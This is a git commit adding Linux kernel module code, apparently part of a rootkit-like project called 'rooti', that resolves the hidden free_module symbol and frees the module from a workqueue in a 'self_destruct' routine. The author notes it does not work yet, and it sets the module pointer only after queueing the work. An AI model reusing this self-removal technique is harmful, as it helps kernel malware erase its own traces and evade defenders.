d02422befbebf75a34b7341cd4db5401c5b899f0
Omri Ben Zikri <omribenzikri10@gmail.com>
2025-10-05 20:04:53 +0000

    Self unloading code that doesn't work yet

---
+++ src/capabilities/unload.c
@@ -0,0 +1,28 @@
+#include <linux/workqueue.h>
+#include <linux/module.h>
+#include <linux/unistd.h>
+#include <linux/kernel.h>
+#include <linux/mutex.h>
+#include "unload.h"
+#include "../utils.h"
+
+static struct module *mod = NULL;
+
+static void rooti_self_unload(struct work_struct *work)
+{
+    void (*__free_module)(struct module *mod) = (void (*)(struct module *))__kallsyms_lookup_name("free_module");
+    if (__free_module == NULL) {
+        ROOTI_DEBUG("unresolved symbol: '__free_module'");
+        return;
+    }
+    mod->exit();
+    __free_module(mod);
+}
+
+DECLARE_WORK(rooti_self_unload_work, rooti_self_unload);
+
+void rooti_self_destruct()
+{
+    queue_work(system_long_wq, &rooti_self_unload_work);
+    mod = THIS_MODULE;
+}
---
+++ src/capabilities/unload.h
@@ -0,0 +1,6 @@
+#ifndef _ROOTI_UNLOAD_H
+#define _ROOTI_UNLOAD_H
+
+void rooti_self_destruct(void);
+
+#endif
